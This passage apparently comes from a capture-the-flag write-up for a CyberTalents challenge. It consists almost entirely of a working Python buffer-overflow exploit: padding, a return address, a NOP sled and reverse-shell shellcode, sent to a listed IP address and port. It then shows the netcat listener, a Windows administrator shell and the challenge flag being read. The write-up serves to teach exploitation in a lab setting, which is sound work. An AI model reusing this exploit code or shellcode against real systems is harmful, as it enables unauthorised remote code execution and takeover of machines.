buf += b"\xc0\x17\xdf\xfe\x4f\x8c\x77\xb3\x18\x0a\x80\xb4\x32"
buf += b"\xea\x1e\x4b\xbd\x0b\x37\x88\xe9\x5b\x2f\x39\x92\x37"
buf += b"\xaf\xc6\x47\x97\xff\x68\x38\x58\xaf\xc8\xe8\x30\xa5"
buf += b"\xc6\xd7\x21\xc6\x0c\x70\xcb\x3d\xc7\x7c\x82\x9a\x13"
buf += b"\xeb\x98\xe4\x36\xd6\x15\x02\x22\x38\x70\x9d\xdb\xa1"
buf += b"\xd9\x55\x7d\x2d\xf4\x10\xbd\xa5\xfb\xe5\x70\x4e\x71"
buf += b"\xf5\xe5\xbe\xcc\xa7\xa0\xc1\xfa\xcf\x2f\x53\x61\x0f"
buf += b"\x39\x48\x3e\x58\x6e\xbe\x37\x0c\x82\x99\xe1\x32\x5f"
buf += b"\x7f\xc9\xf6\x84\xbc\xd4\xf7\x49\xf8\xf2\xe7\x97\x01"
buf += b"\xbf\x53\x48\x54\x69\x0d\x2e\x0e\xdb\xe7\xf8\xfd\xb5"
buf += b"\x6f\x7c\xce\x05\xe9\x81\x1b\xf0\x15\x33\xf2\x45\x2a"
buf += b"\xfc\x92\x41\x53\xe0\x02\xad\x8e\xa0\x23\x4c\x1a\xdd"
buf += b"\xcb\xc9\xcf\x5c\x96\xe9\x3a\xa2\xaf\x69\xce\x5b\x54"
buf += b"\x71\xbb\x5e\x10\x35\x50\x13\x09\xd0\x56\x80\x2a\xf1"
```

Then we will edit our exploit to look like that, note that the secure_server is running in the remote machine at port 1887 so we have to change it also:

```python
#!/usr/bin/python3
import sys
from time import sleep
import socket

buf =  b""
buf += b"\xb8\x42\x49\xf8\x19\xd9\xed\xd9\x74\x24\xf4\x5d\x29"
buf += b"\xc9\xb1\x52\x83\xed\xfc\x31\x45\x0e\x03\x07\x47\x1a"
buf += b"\xec\x7b\xbf\x58\x0f\x83\x40\x3d\x99\x66\x71\x7d\xfd"
buf += b"\xe3\x22\x4d\x75\xa1\xce\x26\xdb\x51\x44\x4a\xf4\x56"
buf += b"\xed\xe1\x22\x59\xee\x5a\x16\xf8\x6c\xa1\x4b\xda\x4d"
buf += b"\x6a\x9e\x1b\x89\x97\x53\x49\x42\xd3\xc6\x7d\xe7\xa9"
buf += b"\xda\xf6\xbb\x3c\x5b\xeb\x0c\x3e\x4a\xba\x07\x19\x4c"
buf += b"\x3d\xcb\x11\xc5\x25\x08\x1f\x9f\xde\xfa\xeb\x1e\x36"
buf += b"\x33\x13\x8c\x77\xfb\xe6\xcc\xb0\x3c\x19\xbb\xc8\x3e"
buf += b"\xa4\xbc\x0f\x3c\x72\x48\x8b\xe6\xf1\xea\x77\x16\xd5"
buf += b"\x6d\xfc\x14\x92\xfa\x5a\x39\x25\x2e\xd1\x45\xae\xd1"
buf += b"\x35\xcc\xf4\xf5\x91\x94\xaf\x94\x80\x70\x01\xa8\xd2"
buf += b"\xda\xfe\x0c\x99\xf7\xeb\x3c\xc0\x9f\xd8\x0c\xfa\x5f"
buf += b"\x77\x06\x89\x6d\xd8\xbc\x05\xde\x91\x1a\xd2\x21\x88"
buf += b"\xdb\x4c\xdc\x33\x1c\x45\x1b\x67\x4c\xfd\x8a\x08\x07"
buf += b"\xfd\x33\xdd\x88\xad\x9b\x8e\x68\x1d\x5c\x7f\x01\x77"
buf += b"\x53\xa0\x31\x78\xb9\xc9\xd8\x83\x2a\xf5\x92\x2c\xae"
buf += b"\x91\xa8\x32\x82\x5c\x24\xd4\xb6\x8e\x60\x4f\x2f\x36"
buf += b"\x29\x1b\xce\xb7\xe7\x66\xd0\x3c\x04\x97\x9f\xb4\x61"
buf += b"\x8b\x48\x35\x3c\xf1\xdf\x4a\xea\x9d\xbc\xd9\x71\x5d"
buf += b"\xca\xc1\x2d\x0a\x9b\x34\x24\xde\x31\x6e\x9e\xfc\xcb"
buf += b"\xf6\xd9\x44\x10\xcb\xe4\x45\xd5\x77\xc3\x55\x23\x77"
buf += b"\x4f\x01\xfb\x2e\x19\xff\xbd\x98\xeb\xa9\x17\x76\xa2"
buf += b"\x3d\xe1\xb4\x75\x3b\xee\x90\x03\xa3\x5f\x4d\x52\xdc"
buf += b"\x50\x19\x52\xa5\x8c\xb9\x9d\x7c\x15\xd9\x7f\x54\x60"
buf += b"\x72\x26\x3d\xc9\x1f\xd9\xe8\x0e\x26\x5a\x18\xef\xdd"
buf += b"\x42\x69\xea\x9a\xc4\x82\x86\xb3\xa0\xa4\x35\xb3\xe0"

buffer = "A" * 998 + "\xA0\x12\x50\x62" + "\x90" * 40 + buf

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(5)
s.connect(("18.193.129.237", 1887))
s.recv(1024)
s.send(("SECRET"+ buffer + '\r\n'))
s.close()
```
‌
and We got a reverse shell!

```bash
root@kali:~/CyberTalents/Crashed# python exploit-remote.py
root@kali:~# nc -nvlp 9001
listening on [any] 9001 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 43124
Microsoft Windows [Version 10.0.17763.1397]
(c) 2018 Microsoft Corporation. All rights reserved.
c:\Users\Administrator\Desktop>whoami
whoami
ec2amaz-hf7234c\administrator
```

### **Flag**
```c

C:\Windows\system32>cd c:\Users\Administrator\Desktop 
cd c:\Users\Administrator\Desktop

c:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 3467-4F3A

 Directory of c:\Users\Administrator\Desktop

09/14/2020  10:50 PM    <DIR>          .
09/14/2020  10:50 PM    <DIR>          ..
06/21/2016  03:36 PM               527 EC2 Feedback.website
06/21/2016  03:36 PM               554 EC2 Microsoft Windows Guide.website
09/10/2020  12:35 AM                32 flag.txt
09/10/2020  04:38 PM    <DIR>          snapshot_2020-08-16_04-47
09/10/2020  04:38 PM        32,121,736 snapshot_2020-08-16_04-47.zip
09/14/2020  08:38 AM    <DIR>          vulnserver-master
               4 File(s)     32,122,849 bytes
               4 Dir(s)  16,779,464,704 bytes free

c:\Users\Administrator\Desktop>type flag.txt
type flag.txt
ffa3857489xxxxxxxxx474c9d
```